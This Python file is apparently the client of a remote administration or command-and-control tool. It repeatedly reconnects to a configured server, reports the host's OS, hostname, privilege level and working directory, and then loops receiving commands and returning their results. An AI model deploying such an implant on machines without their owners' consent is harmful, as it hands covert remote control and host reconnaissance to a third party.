import os
import platform
import socket
import sys
import time
import uuid

from client.config.config import SERVER_ADDR
from core.utils.client_util import check_privilege
from client.connection.server_connection import ServerConnection
from core.utils.logger import logger


class Client:
    RECONNECT_INTERVAL = 5

    def __init__(self, address):
        self.address = address
        self.server = ServerConnection()

        self.client_id = str(uuid.uuid4())

    def _create_connection(self):
        """
        创建一个新的服务端连接对象
        """
        self.server = ServerConnection()
        self.server.client_id = self.client_id

    def _close_current_connection(self):
        """
        关闭当前连接
        """
        try:
            self.server.close()
        except Exception:
            pass

    def _reset_connection(self):
        """
        关闭当前连接并重建连接对象
        """
        self._close_current_connection()
        self._create_connection()

    def _build_client_info(self):
        """
        构造客户端基础信息
        """
        return {
            'id': self.client_id,
            'type': 'info',
            'os_type': platform.system(),
            'os_ver': platform.platform(),
            'hostname': socket.gethostname(),
            'integrity': check_privilege(),
            'cwd': os.getcwd(),
        }

    def _connect_socket(self):
        """
        建立到底层服务端的连接；失败时持续重试
        """
        logger.info(f'Connecting to {self.address}')

        while not self.server.connect(self.address):
            time.sleep(self.RECONNECT_INTERVAL)
            print('Attempting to reconnect...')
            self._create_connection()

    def _handshake(self):
        """
        连接建立后发送客户端握手信息
        """
        info = self._build_client_info()
        self.server.send(info)
        logger.info('Connected')

    def connect(self):
        """
        建立连接并完成握手
        """
        self._connect_socket()
        self._handshake()

    def _recover_from_connection_error(self, error):
        """
        连接异常后的恢复逻辑
        """
        logger.error(error, exc_info=True)
        self._reset_connection()
        self.connect()

    def wait(self):
        while True:
            try:
                result = self.server.recv_command()
                if result:
                    self.server.send_result(*result)
            except SystemExit:
                logger.info('Server closed this connection')
                break
            except socket.error as e:
                self._recover_from_connection_error(e)
            except Exception as e:
                self._recover_from_connection_error(e)


if __name__ == '__main__':
    client = Client(SERVER_ADDR)
    try:
        client.connect()
        client.wait()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(e, exc_info=True)